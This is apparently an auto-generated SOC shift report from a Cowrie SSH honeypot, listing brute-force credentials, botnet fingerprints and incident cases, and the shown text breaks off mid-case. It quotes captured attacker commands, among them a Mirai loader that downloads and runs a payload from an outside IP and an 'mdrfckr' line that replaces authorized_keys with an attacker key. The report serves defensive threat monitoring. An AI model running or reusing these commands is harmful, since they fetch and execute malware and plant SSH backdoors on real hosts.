# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-08-23 |
| **Generated At** | 2026-08-23T08:35:25Z |
| **Shift Time** | 08:35 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **207** |
| Confirmed Threats | **187** |
| False Positives Filtered | **20** (9.7%) |
| Unique Attacker IPs | **85** |
| Countries of Origin | **34** |
| High Severity Cases | **84** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **123** |
| Malware Samples Analyzed | **2** HIGH · **19** MED · 23 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **97** |
| Unique Credential Pairs | **51** |
| Unique Usernames | **17** |
| Unique Passwords | **48** |
| Successful Auth Pairs | **89** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 16 |
| `ubuntu` | 13 |
| `nobody` | 11 |
| `unknown` | 11 |
| `centos` | 8 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 11 |
| `admin` | 6 |
| `unknown2008` | 6 |
| `user2005` | 6 |
| `nobody2000` | 4 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `supervisor` | `123456` | 6 |
| `unknown` | `unknown2008` | 6 |
| `user` | `user2005` | 6 |
| `admin` | `admin` | 5 |
| `unknown` | `123456` | 5 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `nobody` | `nobody2023` | `219.144.16.16` | 2026-08-23T04:58:18 |
| `nobody` | `nobody2023` | `178.224.53.154` | 2026-08-23T04:58:29 |
| `root` | `admin1234!` | `69.6.223.142` | 2026-08-23T04:59:13 |
| `345gs5662d34` | `345gs5662d34` | `69.6.223.142` | 2026-08-23T04:59:16 |
| `root` | `3245gs5662d34` | `69.6.223.142` | 2026-08-23T04:59:17 |
| `finn` | `finn` | `97.93.43.157` | 2026-08-23T05:00:23 |
| `345gs5662d34` | `345gs5662d34` | `97.93.43.157` | 2026-08-23T05:00:26 |
| `finn` | `3245gs5662d34` | `97.93.43.157` | 2026-08-23T05:00:26 |
| `ubuntu` | `ADMIN@123` | `217.60.255.130` | 2026-08-23T05:00:42 |
| `root` | `12345@12345` | `217.60.255.130` | 2026-08-23T05:00:46 |
| `guest` | `123456789` | `78.187.230.168` | 2026-08-23T05:01:56 |
| `guest` | `123456789` | `203.123.219.137` | 2026-08-23T05:02:05 |
| `admin` | `admin` | `68.183.234.194` | 2026-08-23T05:02:33 |
| `admin` | `admin` | `130.12.180.51` | 2026-08-23T05:02:34 |
| `support` | `support` | `10.0.0.73` | 2026-08-23T05:02:59 |
| `ubnt` | `ubnt2019` | `111.171.125.94` | 2026-08-23T05:06:50 |
| `ubnt` | `ubnt2019` | `177.174.0.3` | 2026-08-23T05:06:58 |
| `ubuntu` | `QWERTY!@#` | `217.60.255.130` | 2026-08-23T05:10:14 |
| `root` | `aaaaaaaa` | `217.60.255.130` | 2026-08-23T05:10:18 |
| `nobody` | `nobody2000` | `69.194.3.6` | 2026-08-23T05:12:00 |
| `nobody` | `nobody2000` | `220.80.223.144` | 2026-08-23T05:12:10 |
| `nobody` | `nobody2000` | `36.92.35.211` | 2026-08-23T05:12:14 |
| `nobody` | `nobody2000` | `212.174.62.233` | 2026-08-23T05:12:22 |
| `supervisor` | `123456` | `10.0.0.73` | 2026-08-23T05:13:42 |
| `supervisor` | `123456` | `36.73.187.173` | 2026-08-23T05:15:22 |
| `supervisor` | `123456` | `103.224.19.186` | 2026-08-23T05:15:35 |
| `ubnt` | `ubnt2019` | `10.0.0.73` | 2026-08-23T05:17:58 |
| `ubuntu` | `Bismillah123` | `217.60.255.130` | 2026-08-23T05:19:38 |
| `root` | `aaa.123456` | `217.60.255.130` | 2026-08-23T05:19:42 |
| `centos` | `centos2025` | `10.0.0.73` | 2026-08-23T05:26:47 |
| `ubuntu` | `Superuser` | `217.60.255.130` | 2026-08-23T05:29:15 |
| `root` | `open1234` | `217.60.255.130` | 2026-08-23T05:29:18 |
| `supervisor` | `123456` | `124.160.255.180` | 2026-08-23T05:30:51 |
| `supervisor` | `123456` | `176.170.1.244` | 2026-08-23T05:31:11 |
| `ubuntu` | `Microsoft@2025` | `217.60.255.130` | 2026-08-23T05:38:34 |
| `root` | `xx123!` | `217.60.255.130` | 2026-08-23T05:38:38 |
| `unknown` | `unknown2008` | `47.247.73.99` | 2026-08-23T05:39:31 |
| `unknown` | `unknown2008` | `211.169.212.206` | 2026-08-23T05:39:40 |
| `centos` | `centos2025` | `136.56.34.147` | 2026-08-23T05:44:29 |
| `centos` | `centos2025` | `211.58.176.42` | 2026-08-23T05:44:37 |
| `centos` | `centos2025` | `196.188.93.169` | 2026-08-23T05:44:42 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.76.194.102` | 2026-08-23T05:47:15 |
| `*1` | `$4` | `34.76.194.102` | 2026-08-23T05:47:24 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 7717` | `34.76.194.102` | 2026-08-23T05:47:26 |
| `ubuntu` | `vps123456` | `217.60.255.130` | 2026-08-23T05:48:05 |
| `root` | `!Q2w3e4r5t6y` | `217.60.255.130` | 2026-08-23T05:48:09 |
| `unknown` | `unknown2008` | `10.0.0.73` | 2026-08-23T05:50:34 |
| `root` | `admin` | `45.198.224.26` | 2026-08-23T05:56:28 |
| `ubuntu` | `12345678a` | `217.60.255.130` | 2026-08-23T05:57:33 |
| `root` | `123qweasdzxc` | `217.60.255.130` | 2026-08-23T05:57:37 |
| `ubuntu` | `123qwerty` | `217.60.255.130` | 2026-08-23T06:07:02 |
| `root` | `Qq112233` | `217.60.255.130` | 2026-08-23T06:07:06 |
| `unknown` | `unknown2008` | `69.124.69.20` | 2026-08-23T06:07:07 |
| `unknown` | `unknown2008` | `213.230.64.246` | 2026-08-23T06:07:14 |
| `unknown` | `123456` | `202.88.236.38` | 2026-08-23T06:12:17 |
| `unknown` | `123456` | `181.119.64.79` | 2026-08-23T06:12:25 |
| `ubuntu` | `Adam@1234` | `217.60.255.130` | 2026-08-23T06:16:22 |
| `root` | `P@$$word123` | `217.60.255.130` | 2026-08-23T06:16:26 |
| `nobody` | `nobody2009` | `81.215.2.43` | 2026-08-23T06:17:07 |
| `nobody` | `nobody2009` | `170.168.6.27` | 2026-08-23T06:17:14 |
| `centos` | `centos2024` | `177.135.206.10` | 2026-08-23T06:20:15 |
| `unknown` | `123456` | `10.0.0.73` | 2026-08-23T06:23:18 |
| `ubuntu` | `P@ssw0rd#` | `217.60.255.130` | 2026-08-23T06:25:58 |
| `root` | `Password123!` | `217.60.255.130` | 2026-08-23T06:26:01 |
| `support` | `support` | `176.53.159.196` | 2026-08-23T06:26:45 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `34.77.236.250` | 2026-08-23T06:27:14 |
| `*1` | `$4` | `34.77.236.250` | 2026-08-23T06:27:27 |
| `OPTIONS rtsp://example.com RTSP/1.0` | `Cseq: 1384` | `34.77.236.250` | 2026-08-23T06:27:29 |
| `admin` | `admin` | `85.239.149.72` | 2026-08-23T06:29:16 |
| `user` | `user2005` | `10.0.0.73` | 2026-08-23T06:31:58 |
| `ubuntu` | `Admin-123` | `217.60.255.130` | 2026-08-23T06:35:26 |
| `root` | `Abc123456.` | `217.60.255.130` | 2026-08-23T06:35:30 |
| `centos` | `centos2024` | `43.173.98.142` | 2026-08-23T06:35:39 |
| `centos` | `centos2024` | `120.238.23.168` | 2026-08-23T06:35:49 |
| `unknown` | `123456` | `190.75.248.87` | 2026-08-23T06:39:47 |
| `unknown` | `123456` | `218.29.231.106` | 2026-08-23T06:39:55 |
| `admin` | `admin` | `207.175.205.217` | 2026-08-23T06:39:59 |
| `default` | `Password` | `45.55.133.80` | 2026-08-23T06:44:52 |
| `ubuntu` | `123Admin` | `217.60.255.130` | 2026-08-23T06:45:00 |
| `default` | `Password` | `187.8.120.90` | 2026-08-23T06:45:00 |
| `root` | `Administrator@12345` | `217.60.255.130` | 2026-08-23T06:45:04 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `172.239.71.239` | 2026-08-23T06:45:15 |
| `user` | `user2005` | `221.182.185.190` | 2026-08-23T06:49:37 |
| `user` | `user2005` | `210.0.90.81` | 2026-08-23T06:49:46 |
| `user` | `user2005` | `41.42.6.111` | 2026-08-23T06:49:48 |
| `nobody` | `nobody2005` | `10.0.0.73` | 2026-08-23T06:51:17 |
| `nobody` | `nobody2005` | `111.70.32.6` | 2026-08-23T06:52:52 |
| `ubuntu` | `1qazxsw2` | `217.60.255.130` | 2026-08-23T06:54:29 |
| `root` | `micro123` | `217.60.255.130` | 2026-08-23T06:54:34 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **207** |
| Sessions with Fingerprint | **12** |
| Unique HASSH Fingerprints | **12** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| OpenSSH | 41 |
| libssh | 34 |
| Nmap scanner | 18 |
| Go SSH scanner | 4 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `acaa53e0a7d7...` | Mirai/variant | 39 | 37 |
| `419da4c91ddb...` | Modern SSH client | 26 | 1 |
| `f555226df196...` | Mirai/variant | 6 | 2 |
| `e788c657d1a2...` | Mirai/variant | 6 | 1 |
| `bc9e7273cde2...` | Mirai/variant | 2 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `acaa53e0a7d7...` | OpenSSH | 39 | 37 | Mirai/variant |
| `419da4c91ddb...` | libssh | 26 | 1 | Modern SSH client |
| `95420f9d932d...` | Nmap scanner | 11 | 6 | — |
| `f555226df196...` | libssh | 6 | 2 | Mirai/variant |
| `e788c657d1a2...` | Nmap scanner | 6 | 1 | Mirai/variant |
| `bc9e7273cde2...` | OpenSSH | 2 | 2 | Mirai/variant |
| `19532158b559...` | libssh | 2 | 2 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 2 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1070, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 2 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/dev/null 2>&1 &
```
```
cd /tmp
```
```
wget http://5.182.210.174/ok
```
```
curl -O http://5.182.210.174/ok
```
```
chmod +x ok
```
Source IPs: `45.198.224.26`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `69.6.223.142`, `97.93.43.157`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **85** |
| Unique ASNs | **65** |
| High-Risk ASNs | **52** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS63949` | Akamai Connected Cloud | 5 | HIGH |
| `AS25369` | Hydra Communications Ltd | 5 | HIGH |
| `AS396982` | Google LLC | 5 | HIGH |
| `AS9121` | Turk Telekomunikasyon Anonim Sirketi | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS140499` | Khan Telecom | 2 | LOW |
| `AS7713` | PT Telekomunikasi Indonesia | 2 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (84)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-83b7db14e475

| Field | Detail |
|---|---|
| **Source IP** | `219.144.16[.]16` |
| **First Seen** | 2026-08-23 04:58 |
| **Last Seen** | 2026-08-23 04:58 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:58:14` | `cowrie.session.connect` |
| `2026-08-23 04:58:15` | `cowrie.client.version` |
| `2026-08-23 04:58:15` | `cowrie.client.kex` |
| `2026-08-23 04:58:18` | `cowrie.login.success` |
| `2026-08-23 04:58:19` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:58:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.144.16[.]16` to AbuseIPDB if not already reported
- [ ] Block `219.144.16[.]16` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-088acb21f87f

| Field | Detail |
|---|---|
| **Source IP** | `178.224.53[.]154` |
| **First Seen** | 2026-08-23 04:58 |
| **Last Seen** | 2026-08-23 04:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:58:28` | `cowrie.session.connect` |
| `2026-08-23 04:58:29` | `cowrie.client.version` |
| `2026-08-23 04:58:29` | `cowrie.client.kex` |
| `2026-08-23 04:58:29` | `cowrie.login.success` |
| `2026-08-23 04:58:29` | `cowrie.direct-tcpip.request` |
| `2026-08-23 04:58:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.224.53[.]154` to AbuseIPDB if not already reported
- [ ] Block `178.224.53[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d6cbf3e4f31

| Field | Detail |
|---|---|
| **Source IP** | `69.6.223[.]142` |
| **First Seen** | 2026-08-23 04:59 |
| **Last Seen** | 2026-08-23 04:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:59:12` | `cowrie.session.connect` |
| `2026-08-23 04:59:12` | `cowrie.client.version` |
| `2026-08-23 04:59:13` | `cowrie.client.kex` |
| `2026-08-23 04:59:13` | `cowrie.login.success` |
| `2026-08-23 04:59:14` | `cowrie.session.params` |
| `2026-08-23 04:59:14` | `cowrie.command.input` |
| `2026-08-23 04:59:14` | `cowrie.command.failed` |
| `2026-08-23 04:59:14` | `cowrie.log.closed` |
| `2026-08-23 04:59:15` | `cowrie.session.params` |
| `2026-08-23 04:59:15` | `cowrie.command.input` |
| `2026-08-23 04:59:15` | `cowrie.session.file_download` |
| `2026-08-23 04:59:15` | `cowrie.log.closed` |
| `2026-08-23 04:59:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.223[.]142` to AbuseIPDB if not already reported
- [ ] Block `69.6.223[.]142` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40a612f2f3e9

| Field | Detail |
|---|---|
| **Source IP** | `69.6.223[.]142` |
| **First Seen** | 2026-08-23 04:59 |
| **Last Seen** | 2026-08-23 04:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:59:16` | `cowrie.session.connect` |
| `2026-08-23 04:59:16` | `cowrie.client.version` |
| `2026-08-23 04:59:16` | `cowrie.client.kex` |
| `2026-08-23 04:59:16` | `cowrie.login.success` |
| `2026-08-23 04:59:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.223[.]142` to AbuseIPDB if not already reported
- [ ] Block `69.6.223[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4ef8df265c0

| Field | Detail |
|---|---|
| **Source IP** | `69.6.223[.]142` |
| **First Seen** | 2026-08-23 04:59 |
| **Last Seen** | 2026-08-23 04:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 04:59:16` | `cowrie.session.connect` |
| `2026-08-23 04:59:16` | `cowrie.client.version` |
| `2026-08-23 04:59:17` | `cowrie.client.kex` |
| `2026-08-23 04:59:17` | `cowrie.login.success` |
| `2026-08-23 04:59:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.6.223[.]142` to AbuseIPDB if not already reported
- [ ] Block `69.6.223[.]142` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b9601750f3b4

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-08-23 05:00 |
| **Last Seen** | 2026-08-23 05:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:00:23` | `cowrie.session.connect` |
| `2026-08-23 05:00:23` | `cowrie.client.version` |
| `2026-08-23 05:00:23` | `cowrie.client.kex` |
| `2026-08-23 05:00:23` | `cowrie.login.success` |
| `2026-08-23 05:00:24` | `cowrie.session.params` |
| `2026-08-23 05:00:24` | `cowrie.command.input` |
| `2026-08-23 05:00:24` | `cowrie.command.failed` |
| `2026-08-23 05:00:24` | `cowrie.log.closed` |
| `2026-08-23 05:00:25` | `cowrie.session.params` |
| `2026-08-23 05:00:25` | `cowrie.command.input` |
| `2026-08-23 05:00:25` | `cowrie.session.file_download` |
| `2026-08-23 05:00:25` | `cowrie.log.closed` |
| `2026-08-23 05:00:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63772efb2826

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-08-23 05:00 |
| **Last Seen** | 2026-08-23 05:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:00:25` | `cowrie.session.connect` |
| `2026-08-23 05:00:25` | `cowrie.client.version` |
| `2026-08-23 05:00:25` | `cowrie.client.kex` |
| `2026-08-23 05:00:26` | `cowrie.login.success` |
| `2026-08-23 05:00:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d03a9f61fcc

| Field | Detail |
|---|---|
| **Source IP** | `97.93.43[.]157` |
| **First Seen** | 2026-08-23 05:00 |
| **Last Seen** | 2026-08-23 05:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:00:26` | `cowrie.session.connect` |
| `2026-08-23 05:00:26` | `cowrie.client.version` |
| `2026-08-23 05:00:26` | `cowrie.client.kex` |
| `2026-08-23 05:00:26` | `cowrie.login.success` |
| `2026-08-23 05:00:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `97.93.43[.]157` to AbuseIPDB if not already reported
- [ ] Block `97.93.43[.]157` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5163dd98bd1

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 05:00 |
| **Last Seen** | 2026-08-23 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:00:41` | `cowrie.session.connect` |
| `2026-08-23 05:00:41` | `cowrie.client.version` |
| `2026-08-23 05:00:41` | `cowrie.client.kex` |
| `2026-08-23 05:00:42` | `cowrie.login.success` |
| `2026-08-23 05:00:42` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:00:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 05:00:42` | `cowrie.direct-tcpip.data` |
| `2026-08-23 05:00:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf958dedc27e

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-23 05:00 |
| **Last Seen** | 2026-08-23 05:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:00:45` | `cowrie.session.connect` |
| `2026-08-23 05:00:45` | `cowrie.client.version` |
| `2026-08-23 05:00:45` | `cowrie.client.kex` |
| `2026-08-23 05:00:46` | `cowrie.login.success` |
| `2026-08-23 05:00:46` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:00:47` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-23 05:00:47` | `cowrie.direct-tcpip.data` |
| `2026-08-23 05:00:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38a68b16c5bf

| Field | Detail |
|---|---|
| **Source IP** | `78.187.230[.]168` |
| **First Seen** | 2026-08-23 05:01 |
| **Last Seen** | 2026-08-23 05:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:01:54` | `cowrie.session.connect` |
| `2026-08-23 05:01:54` | `cowrie.client.version` |
| `2026-08-23 05:01:54` | `cowrie.client.kex` |
| `2026-08-23 05:01:56` | `cowrie.login.success` |
| `2026-08-23 05:01:56` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:02:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.187.230[.]168` to AbuseIPDB if not already reported
- [ ] Block `78.187.230[.]168` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a41b40804d84

| Field | Detail |
|---|---|
| **Source IP** | `203.123.219[.]137` |
| **First Seen** | 2026-08-23 05:02 |
| **Last Seen** | 2026-08-23 05:02 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-23 05:02:01` | `cowrie.session.connect` |
| `2026-08-23 05:02:02` | `cowrie.client.version` |
| `2026-08-23 05:02:02` | `cowrie.client.kex` |
| `2026-08-23 05:02:05` | `cowrie.login.success` |
| `2026-08-23 05:02:06` | `cowrie.direct-tcpip.request` |
| `2026-08-23 05:02:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.123.219[.]137` to AbuseIPDB if not already reported
- [ ] Block `203.123.219[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2e4ad67102a

| Field | Detail |
|---|---|
| **Source IP** | `68.183.234[.]194` |
| **First Seen** | 2026-08-23 05:02 |
| **Last Seen** | 2026-08-23 05:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
